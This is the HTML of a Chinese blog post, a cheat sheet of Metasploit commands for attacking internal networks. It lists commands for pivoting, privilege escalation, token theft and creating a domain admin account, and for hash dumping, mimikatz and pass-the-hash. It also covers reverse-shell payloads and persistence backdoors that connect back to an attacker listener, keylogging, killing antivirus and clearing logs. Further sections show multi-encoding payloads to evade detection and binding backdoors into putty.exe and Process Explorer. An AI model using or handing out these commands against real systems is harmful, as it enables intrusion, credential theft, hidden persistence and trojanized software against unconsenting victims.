@@ -1,0 +1,696 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <link rel="alternate" href="/atom.xml" title="ClearLoveの博客" type="application/atom+xml">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.5.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: 'search.xml',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: '复制',
+      copy_success: '复制成功',
+      copy_failure: '复制失败'
+    },
+    sidebarPadding: 40
+  };
+</script>
+
+  <meta name="description" content="技巧汇总内网代理方法一：meterpreter &amp;gt; run get_local_subnets &#x2F;&#x2F;获取网段meterpreter &amp;gt; run autoroute -s 172.2.175.0&#x2F;24 &#x2F;&#x2F;添加路由meterpreter &amp;gt; run autoroute -p &#x2F;&#x2F;查看路由meterpreter &amp;gt; run autoroute -d -s 172.2.175.0 &#x2F;&#x2F;删除网段meter">
+<meta property="og:type" content="article">
+<meta property="og:title" content="MSF内网渗透测试技巧">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;11&#x2F;27&#x2F;MSF%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%80%E5%B7%A7&#x2F;index.html">
+<meta property="og:site_name" content="ClearLoveの博客">
+<meta property="og:description" content="技巧汇总内网代理方法一：meterpreter &amp;gt; run get_local_subnets &#x2F;&#x2F;获取网段meterpreter &amp;gt; run autoroute -s 172.2.175.0&#x2F;24 &#x2F;&#x2F;添加路由meterpreter &amp;gt; run autoroute -p &#x2F;&#x2F;查看路由meterpreter &amp;gt; run autoroute -d -s 172.2.175.0 &#x2F;&#x2F;删除网段meter">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2019-11-27T08:24:30.582Z">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://yoursite.com/2019/11/27/MSF%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%80%E5%B7%A7/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>MSF内网渗透测试技巧 | ClearLoveの博客</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">ClearLoveの博客</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+        <p class="site-subtitle">我们称之为路的，其实不过是彷徨</p>
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="none"
+           placeholder="搜索..." spellcheck="false"
+           type="text" id="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/27/MSF%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%80%E5%B7%A7/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="魏超">
+      <meta itemprop="description" content="胡歌">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ClearLoveの博客">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          MSF内网渗透测试技巧
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2019-11-27 13:48:26 / 修改时间：16:24:30" itemprop="dateCreated datePublished" datetime="2019-11-27T13:48:26+08:00">2019-11-27</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="技巧汇总"><a href="#技巧汇总" class="headerlink" title="技巧汇总"></a>技巧汇总</h1><h2 id="内网代理"><a href="#内网代理" class="headerlink" title="内网代理"></a>内网代理</h2><p>方法一：<pre><code>meterpreter > run get_local_subnets //获取网段<br>meterpreter > run autoroute -s 172.2.175.0/24 //添加路由<br>meterpreter > run autoroute -p //查看路由<br>meterpreter > run autoroute -d -s 172.2.175.0 //删除网段<br>meterpreter > run post/windows/gather/arp_scanner RHOSTS=7.7.7.0/24 //探测该网段下的存活主机。<br>meterpreter > background //后台sessions</code></pre><br>方法二：<pre><code>meterpreter> run get_local_subnets #查看网段/子网<br>Local subnet: 192.168.33.0/255.255.255.0<br>meterpreter> background #转入后台运行<br>msf> route add 192.168.33.0 255.255.255.0 1 #本地添加路由信息<br>msf> route print #查看添加的信息<br>msf> use linux/samba/lsa_transnames_heap #准备向内网目标主机进攻<br>msf> set payload linux/x86/shell/reverse_tcp<br>msf> set LHOST 10.10.1.129 #此处为attacking 主机的外网IP<br>msf> set LPORT 8080<br>msf> set RHOST 192.168.33.132 #内网目标主机<br>msf> exploit<br>也可以使用自动式添加路由模块：<br>msf> load auto_add_route<br>msf> exploit</code></pre></p><a id="more"></a>
+<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>自动化提权：<pre><code>meterpreter > getsystem //直getsystem提权，最常用简单的办法</code></pre><br>半自动提权：<pre><code>meterpreter > meterpreter > background //先后台运行会话<br>[*] Backgrounding session 1…<br>msf > use post/windows/escalate/ms10_073_kbdlayout<br>msf > show options<br>msf > set session 1 //设置要使用的会话<br>msf post(ms10_073_kbdlayout) > exploit<br>注意：如果创建了一个system进程，就可以立马sessions 1进入会话，然后ps查看进程，使用migrate pid注入到进程。<br>或者直接：<br>meterpreter > run post/windows/escalate/ms10_073_kbdlayout</code></pre></p>
+<h2 id="令牌窃取与模拟"><a href="#令牌窃取与模拟" class="headerlink" title="令牌窃取与模拟"></a>令牌窃取与模拟</h2><p>当有域控账户登陆至服务器时可使用令牌模拟进行渗透取得域控权限，之后登陆其他机器时不需要登陆密码。<br>窃取令牌：<pre><code>meterpreter > use incognito //进入这个模块<br>meterpreter > list_tokens –u //查看存在的令牌<br>meterpreter > impersonate_token NT AUTXXXX\SYSTEM //令牌是DelegationTokens一列，getuid查看，两个斜杠<br>注：只有具有“模仿安全令牌权限”的账户才能去模仿别人的令牌，一般大多数的服务型账户（IIS、MSSQL等）有这个权限，大多数用户级的账户没有这个权限。一般从web拿到的webshell都是IIS服务器权限，是具有这个模仿权限的，建好的账户没有这个权限。使用菜刀（IIS服务器权限）反弹meterpreter是服务型权限。</code></pre><br>令牌模拟：<pre><code>meterpreter> ps # 查看目标机器进程，找出域控账户运行的进程ID，假如发现PID 为380<br>meterpreter> steal_token 380<br>有时ps 命令列出的进程中可能不存在域控账户的进程，此时使用incognito 模块查看可<br>用token：<br>meterpreter> use incognito<br>meterpreter> list_tokens –u #列出可用token，假如找到域控token<br>meterpreter> impersonate_token SNEAKS.IN\ihazdomainadmin<br>meterpreter> add_user hacker password –h 192.168.1.50 #在域控主机上添加账户<br>meterpreter> add_group_user “Domain Admins” hacker –h 192.168.1.50 #将账户添加至域管理员组</code></pre></p>
+<h2 id="BypassUAC"><a href="#BypassUAC" class="headerlink" title="BypassUAC"></a>BypassUAC</h2><pre><code>msf > use exploit/windows/local/bypassuac //32位与64位一样，其他几个模块也一样
+msf > show options
+msf > set session 4
+msf > run //成功后会返回一个新的session，进入新会话，发现权限没变，使用getsystem即可完成提权</code></pre>
+<h2 id="HashDump"><a href="#HashDump" class="headerlink" title="HashDump"></a>HashDump</h2><pre><code>meterpreter > run post/windows/gather/smart_hashdump //读取hash这种做法最智能，效果最好</code></pre>
+<p>64 位win7 下需要管理员权限执行后门且先getsystem，然后使用 run post/windows/gather/hashdump 来dump hash 成功率更高。<br>而且如果要使用shell 添加系统账户的话win7 下得先：</p>
+<pre><code>run post/windows/escalate/bypassuac</code></pre>不然可能不会成功
+<h2 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h2><p>服务器启动后门：<pre><code>meterpreter > run metsvc -A //再开起一个终端，进入msfconsole<br>msf > use exploit/multi/handler //新终端中监听<br>msf > set payload windows/metsvc_bind_tcp<br>msf > set LPORT 31337<br>msf > set RHOST 192.168.0.128<br>msf > run //获取到的会话是system权限</code></pre><br>启动项启动后门：</p>
+<pre><code>meterpreter > run persistence -X -i 10 -p 6666 -r 192.168.71.105</code></pre>
+<p>-X 系统开机自启，-i 10 10秒重连一次，-p 监听端口，-r 监听机。直接监听就好了，他自己会链接回来。注意到移除 persistence 后门的办法是删除 HKLM\Software\Microsoft\Windows\CurrentVersion\Run\ 中的注册表键和 C:\WINDOWS\TEMP\ 中的 VBScript 文件。<br>下次连接时：</p>
+<pre><code>msf> use multi/handler 
+set payload windows/meterpreter/reverse_tcp 
+set LPOST 443 
+set LHOST 192.168.1.111 
+exploit</code></pre>
+<p>会在以下位置和注册表以随机文件名写入文件等信息，如：</p>
+<pre><code>C:\Users\YourtUserName\AppData\Local\Temp\MXIxVNCy.vbs 
+C:\Users\YourtUserName\AppData\Local\Temp\radF871B.tmp\svchost.exe 
+HKLM\Software\Microsoft\Windows\CurrentVersion\Run\DjMzwzCDaoIcgNP)</code></pre>
+<p>缺点：容易被杀毒软件杀 。<br>弊端：这两个后门有个弊端，在进程中都会存在服务名称为meterpreter的进程</p>
+<h2 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h2><p>端口扫描：</p>
+<pre><code>use auxiliary/scanner/portscan/tcp
+show options
+set rhosts 192.168.2.1-255
+set ports 21,22,25,443,445,1433,3306
+set threads 20
+exploit
+</code></pre>
+<p>MSSQL开发利用：<br>对各个ip是否有mssql服务的探测</p>
+<pre><code>use scanner/mssql/mssql_ping //测试MSSQL的存在和信息
+show options
+set rhosts 192.168.2.1-255
+set threads 30
+exploit
+</code></pre>
+<p>对扫描到的IP进行爆破</p>
+<pre><code>msf> use auxiliary/scanner/mssql/mssql_login 
+show options 
+set PASS_FILE /pentest/exploits/fasttrack/bin/dict/wordlist.txt 
+set RHOSTS 192.168.1.130 
+set THREADS 10 
+set verbose false 
+exploit</code></pre>
+<p>sa权限对其利用</p>
+<pre><code>use admin/mssql/mssql_exec
+set rhost 192.168.2.10
+set password sa
+set CMD cmd.exe /c echo hello
+exploit</code></pre>
+<p>使用MSSQL自带的 xp_cmdshell 添加账户</p>
+<pre><code>msf> use exploit/windows/mssql/mssql_payload 
+show options 
+set payload windows/meterpreter/reverse_tcp 
+set LHOST 192.168.1.111 
+set LPORT 433 
+set RHOST 192.168.1.130 
+set PASSWORD password130 
+exploit</code></pre>
+<p>MySQL开放利用</p>
+<pre><code>待完善</code></pre>
+<p>爆破ssh模块</p>
+<pre><code>use auxiliary/scanner/ssh/ssh_login
+set rhosts 7.7.7.20
+set username root
+set pass_file /root/pass.txt //加载字典，可以收集密码做字典
+set threads 50
+run</code></pre>
+<p>通过nmap扫描基本漏洞</p>
+<pre><code>msf > nmap –script=vuln 受害靶机ip地址
+msf > nmap –script=mysql-info 192.168.0.4 //扫描mysql数据库信息 版本 等..</code></pre>
+<h2 id="清楚痕迹"><a href="#清楚痕迹" class="headerlink" title="清楚痕迹"></a>清楚痕迹</h2><pre><code>msf > clearev //删除目标机上的应用程序、系统和安全日志。</code></pre>
+<h2 id="读取系统账号密码"><a href="#读取系统账号密码" class="headerlink" title="读取系统账号密码"></a>读取系统账号密码</h2><p>加载mimikatz</p>
+<pre><code>
+meterpreter > load mimikatz //加载mimikatz模块
+meterpreter > wdigest //需要system权限</code></pre>
+<p>读取Hash并使用smb协议登录</p>
+<pre><code>meterpreter> use priv 
+meterpreter> run post/windows/gather/hashdump</code></pre>
+<p>当获取到密码的hash 之后无法破解出明文密码且无法直接使用hash 登陆，需要使用 pass-the-hash 技术：</p>
+<pre><code>
+msf> use windows/smb/psexec 
+set PAYLOAD windows/meterpreter/reverse_tcp 
+set LHOST 192.168.1.111 
+set LPORT 443 
+set RHOST 192.168.1.130 
+set SMBPass aad3b435b51404eeaad3b435b51404ee:b75989f65d1e04af7625ed712ac36c29 
+exploit</code></pre>
+<p>获取到系统权限后我们可以新建一个普通账号，然后使用此账号执行我们的后门：<br>在目标机器上执行：</p>
+<pre><code>
+net user hacker p@ssw0rd /add</code></pre>
+<p>本地生成一个后门程序：</p>
+<pre><code>
+msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.111 LPORT=443 X > payload.exe</code></pre>
+<p>将payload.exe 拷贝到目标机器然后使用新建立的账号执行本地执行端口监听，等待来自目标机器连接：</p>
+<pre><code>
+msfcli multi/handler PAYLOAD=windows/meterpreter/reverse_tcp 
+LHOST=192.168.1.111 LPORT=443 
+use priv 
+getsystem 
+getuid</code></pre>
+<p>至此取得SYSTEM 权限</p>
+<h2 id="键盘记录"><a href="#键盘记录" class="headerlink" title="键盘记录"></a>键盘记录</h2><pre><code>meterpreter> run post/windows/capture/keylog_recorder //运行键盘记录模块，他自己创建本文。</code></pre>
+<p>/root/.msf3/loot/*.txt #查看结果</p>
+<h2 id="进程权限迁移"><a href="#进程权限迁移" class="headerlink" title="进程权限迁移"></a>进程权限迁移</h2><p>当攻击成功后将连接进程从不稳定进程（如使用浏览器溢出漏洞exp 进行攻击时浏览器可能会被目标关闭）迁移至稳定进程(explorer.exe)，保持可连接。</p>
+<pre><code>meterpreter> run post/windows/manage/migrate</code></pre>
+<p>在64 位win7 中migrate 需要管理员权限执行后门才能成功，而migrate 前后获取的权限是有差异的。</p>
+<h2 id="关闭杀毒软件"><a href="#关闭杀毒软件" class="headerlink" title="关闭杀毒软件"></a>关闭杀毒软件</h2><pre><code>meterpreter> run killav （这个脚本要小心使用，可能导致目标机器蓝屏死机。）</code></pre>
+<h2 id="获取系统流量"><a href="#获取系统流量" class="headerlink" title="获取系统流量"></a>获取系统流量</h2><pre><code>meterpreter> run packtrecorder –i 1</code></pre>
+<h2 id="获取目标网络共享"><a href="#获取目标网络共享" class="headerlink" title="获取目标网络共享"></a>获取目标网络共享</h2><pre><code>meterpreter> run scraper</code></pre>
+<p>从目标主机获得所有网络共享等信息。并且获得的这些所有这些信息都存储在 /root/.msf4/logs/scripts/scraper/directory 目录下。使用 ls 命令查看存储的这些文件。</p>
+<h2 id="VNC远程界面控制"><a href="#VNC远程界面控制" class="headerlink" title="VNC远程界面控制"></a>VNC远程界面控制</h2><p>VNC控制命令</p>
+<pre><code>meterpreter> run vnc 
+meterpreter> run screen_unlock</code></pre>
+<h2 id="Windows-API编程-Hello-World弹窗"><a href="#Windows-API编程-Hello-World弹窗" class="headerlink" title="Windows API编程 , Hello World弹窗"></a>Windows API编程 , Hello World弹窗</h2><p>使用Railgun 操作windows APIs</p>
+<pre><code>
+meterpreter > irb
+[*] Starting IRB shell
+[*] The 'client' variable holds the meterpreter client
+client.railgun.user32.MessageBoxA(0,"Hello World","Im Title","MB_OK")</code></pre>
+<h2 id="编码绕过杀软"><a href="#编码绕过杀软" class="headerlink" title="编码绕过杀软"></a>编码绕过杀软</h2><pre><code>msfencode –l #列出可用编码器</code></pre>
+<p>简单编码：</p>
+<pre><code>
+msfpayload windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=31337 R |msfencode –e x86/shikata_ga_nai –t exe > /var/www/payload2.exe</code></pre>
+<p>使用R 参数作为raw 输出至管道，再经过msfencode 处理，最后导出。</p>
+<p>多次编码：</p>
+<pre><code>
+msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.111 LPORT=31337 R | 
+msfencode –e x86/shikata_ga_nai –c 5 –t raw | msfencode –e x86/alpha_upper –c 2 –t raw | 
+msfencode –e x86/shikata_ga_nai –c 5 –t raw | msfencode –e x86/countdown –c 5 –t exe –o 
+/var/www/payload3.exe
+简单编码被杀机会很大，使用多次编码效果更好，这里一共使用了17 次循环编码。
+</code></pre>
+<p>题外：<pre><code>经测试 >>><br>1：使用此命令生成的后门也被MSE 杀到；<br>2：未编码的后门或编码次数较少的后门可以直接被秒杀；<br>3：windows/x64/meterpreter/reverse_tcp 生成的后门未经任何处理仍然不被杀，看来杀毒软件傻逼了；<br>4：x86 编码器编码的后门在64 位机器上无法执行；<br>5：360 有个沙箱功能，后门文件右键选择“在360 隔离沙箱中运行”，msf照样可以连接并操作，看来隔离沙箱功能有限。）</code></pre></p>
+<h2 id="自定义可执行程序模板"><a href="#自定义可执行程序模板" class="headerlink" title="自定义可执行程序模板"></a>自定义可执行程序模板</h2><p>msfencode 默认使用data/templates/templates.exe（msf v4 在templates 目录下有针对不同<br>平台的不同模板）作为可执行程序的模板，杀毒厂商也不是傻逼，所以这里最好使用自定义模板，如：<pre><code>wget <a href="http://download.sysinternals.com/Files/ProcessExplorer.zip" target="_blank" rel="noopener">http://download.sysinternals.com/Files/ProcessExplorer.zip</a><br>cd work<br>unzip ProcessExplorer.zip<br>cd ..<br>msfpayload windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=8080 R | msfencode<br>–t exe –x work/procexp.exe –o /var/www/pe_backdoor.exe –e x86/shikata_ga_nai –c 5</code></pre><br>在目标机器上运行，然后本地使用msfcli 监听端口等待反弹连接：</p>
+<pre><code>
+msfcli exploit/multi/handler PAYLOAD=windows/shell_reverse_tcp LHOST=192.168.1.111 
+LPORT=8080 E</code></pre>
+<h2 id="暗度陈仓—猥琐执行payload-绑定到可执行文件"><a href="#暗度陈仓—猥琐执行payload-绑定到可执行文件" class="headerlink" title="暗度陈仓—猥琐执行payload (绑定到可执行文件)"></a>暗度陈仓—猥琐执行payload (绑定到可执行文件)</h2><p>绑定payload 至一个可执行文件，让目标不知不觉间中招，以putty.exe 为例：</p>
+<pre><code>
+msfpayload windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=8080 R | msfencode 
+–t exe –x putty.exe -o /var/www/putty_backdoor.exe –e x86/shikata_ga_nai –k –c 5</code></pre>
+<p>假如选择一个GUI 界面的程序作为绑定目标并且不使用-k 选项，则目标执行此程序的时候不会弹出cmd 窗口，-k 选项的作用是payload 独立于模板软件的进程运行。</p>
+<h2 id="MetaSploit-创建工作空间"><a href="#MetaSploit-创建工作空间" class="headerlink" title="MetaSploit 创建工作空间"></a>MetaSploit 创建工作空间</h2><p>很多时候，你要在不同的环境下，渗透不同的目标，这个时候 hosts中的IP会很乱，你就需要工作空间来区分开你每次不同的渗透环境中的操作与存储，来说说Metasploit中的 workspace</p>
+<pre><code>
+msf > workspace -h
+Usage:
+    workspace                  List workspaces
+    workspace -v               List workspaces verbosely
+    workspace [name]           Switch workspace
+    workspace -a [name] ...    Add workspace(s)
+    workspace -d [name] ...    Delete workspace(s)
+    workspace -D               Delete all workspaces
+    workspace -r <old> <new>   Rename workspace
+    workspace -h               Show this help information</new></old></code></pre>
+<p>比较常用的命令：</p>
+<p>添加工作空间</p>
+<pre><code>
+msf > workspace -a imworkspaceone
+[*] Added imworkspaceone
+msf ></code></pre>
+<p>选择工作空间</p>
+<pre><code>
+msf > workspace imworkspaceone 
+[*] Workspace: imworkspaceone</code></pre>
+<p>删除工作空间</p>
+<pre><code>
+msf > workspace -d imworkspaceone
+[*] Deleted workspace: imworkspaceone
+[*] Switched workspace: default
+msf ></code></pre>
+<p>操作多个工作空间来分离渗透操作与数据。</p>
+<h2 id="使用-Hosts-中的IP定向渗透"><a href="#使用-Hosts-中的IP定向渗透" class="headerlink" title="使用 Hosts 中的IP定向渗透"></a>使用 Hosts 中的IP定向渗透</h2><p>当你选择好了你的攻击模块的时候 ，想要将 RHOSTS 中的IP列表设置为Hosts中的IP（这里你需要Hosts中有IP才行，可以选中用 db_import 导入，也可以用 db_nmap 扫描获取）</p>
+<p>首先配置你的攻击模块，然后 show options 查看需要配置目标的配置项是RHOSTS还是RHOST，当需要设置RHOSTS的时候 hosts -c address -R 就将hosts中所有IP地址的列表传送给了RHOSTS，执行run 向metasploit发送执行命令。</p>
+<p>以下是一个例子：</p>
+<pre><code>
+msf > use auxiliary/scanner/portscan/tcp
+msf auxiliary(scanner/portscan/tcp) > show options 
+Module options (auxiliary/scanner/portscan/tcp):
+   Name         Current Setting  Required  Description
+   CONCURRENCY  10               yes       The number of concurrent ports to check per host
+   DELAY        0                yes       The delay between connections, per thread, in milliseconds
+   JITTER       0                yes       The delay jitter factor (maximum value by which to +/- DELAY) in milliseconds.
+   PORTS        1-10000          yes       Ports to scan (e.g. 22-25,80,110-900)
+   RHOSTS                        yes       The target address range or CIDR identifier
+   THREADS      1                yes       The number of concurrent threads
+   TIMEOUT      1000             yes       The socket connect timeout in milliseconds
+msf auxiliary(scanner/portscan/tcp) > hosts -c address -R
+Hosts
+address
+10.12.103.171
+10.12.103.172
+10.12.103.173
+10.12.103.174
+10.12.103.191
+10.12.103.192
+...
+...
+...
+...
+10.14.80.212
+10.14.80.213
+10.14.80.214
+10.14.80.215
+10.14.80.216
+RHOSTS => file:/var/folders/0n/78ntbx595w3fll8tn5gk4t3c0000gn/T/msf-db-rhosts-20180412-7048-17nfta1
+msf auxiliary(scanner/portscan/tcp) > run
+[+] 10.12.103.171:        - 10.12.103.171:22 - TCP OPEN
+[+] 10.12.103.171:        - 10.12.103.171:80 - TCP OPEN
+[+] 10.12.103.171:        - 10.12.103.171:111 - TCP OPEN
+</code></pre>
+<h1 id="常用渗透手段"><a href="#常用渗透手段" class="headerlink" title="常用渗透手段"></a>常用渗透手段</h1><h2 id="扫描匿名FTP"><a href="#扫描匿名FTP" class="headerlink" title="扫描匿名FTP"></a>扫描匿名FTP</h2><pre><code>use auxiliary/scanner/ftp/anonymos 
+set RHOSTS 192.168.1.0/24 
+set THREADS 50 
+run</code></pre>
+<h2 id="与nessus-结合扫描"><a href="#与nessus-结合扫描" class="headerlink" title="与nessus 结合扫描"></a>与nessus 结合扫描</h2><p>使用Nessus 扫描完成后生成.nessus 格式的报告，导入到MSF：</p>
+<pre><code>
+db_connect postgres:toor@127.0.0.1/msf 
+db_import /tmp/nessus_report_Host_test.nessus 
+db_hosts –c address,svcs,vulns 
+db_vulns</code></pre>
+<p>在MSF 中使用Nessus：</p>
+<pre><code>
+db_connect postgres:toor@127.0.0.1/msf 
+load nessus 
+nessus_connect nessus:toor@192.168.1.111:8834 ok 
+nessus_policy_list #查看存在的扫描规则 
+nessus_scan_new 2 bridge_scan 192.168.1.111 #2 表示规则的ID 号，bridge_scan 自定义扫描名称 
+nessus_scan_status #查看扫描进行状态 
+nessus_report_list #查看扫描结果 
+nessus_report_get skjla243-3b5d-* #导入报告 
+db_hosts –c address,svcs,vulns</code></pre>
+<h2 id="SMB弱口令扫描"><a href="#SMB弱口令扫描" class="headerlink" title="SMB弱口令扫描"></a>SMB弱口令扫描</h2><pre><code>msf> use auxiliary/scanner/smb/smb_login 
+set RHOSTS 192.168.1.111-222 
+set SMBUser Administrator 
+set SMBPass admin 
+run</code></pre>
+<h2 id="VNC空口令扫描"><a href="#VNC空口令扫描" class="headerlink" title="VNC空口令扫描"></a>VNC空口令扫描</h2><pre><code>msf> use auxiliary/scanner/vnc/vnc_none_auth 
+set RHOSTS 192.168.1.111 
+run</code></pre>
+<h2 id="Open-X11空口令"><a href="#Open-X11空口令" class="headerlink" title="Open X11空口令"></a>Open X11空口令</h2><pre><code>msf> use auxiliary/scanner/x11/open_x11 
+set RHOST 192.168.1.0/24 
+set THREADS 50 
+run</code></pre>
+<h2 id="Msf自动化测试-一行命令执行"><a href="#Msf自动化测试-一行命令执行" class="headerlink" title="Msf自动化测试(一行命令执行)"></a>Msf自动化测试(一行命令执行)</h2><p>为了缩短渗透测试的时间可以将 Msf 命令写入一个文件，然后使用 msfconsole 加载执行。<br>加载方式：msfconsole 的resource 命令或者msfconsole 加上-r 选项<br>例如：</p>
+<pre><code>echo ‘version’ > resource.rc 
+echo ‘load sounds’ >> resource.rc 
+msfconsole –r resource.rc</code></pre>
+<p>例如：</p>
+<pre><code>
+echo ‘use exploit/windows/smb/ms08_067_netapi’ > autoexp.rc 
+echo ‘set RHOST 192.168.1.133’ >> autoexp.rc 
+echo ‘set PAYLOAD windows/meterpreter/reverse_tcp’ >> autoexp.rc 
+echo ‘set LHOST 192.168.1.111’ >> autoexp.rc 
+echo ‘exploit’ >> autoexp.rc 
+msfconsole 
+msf> resource autoexp.rc
+<pre><code></code></pre></code></pre>
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+                <a href="/2019/11/22/%E6%8F%90%E6%9D%83%E6%80%9D%E8%B7%AF%E4%BA%8C/" rel="next" title="提权思路二">
+                  <i class="fa fa-chevron-left"></i> 提权思路二
+                </a>
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+            </div>
+          </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
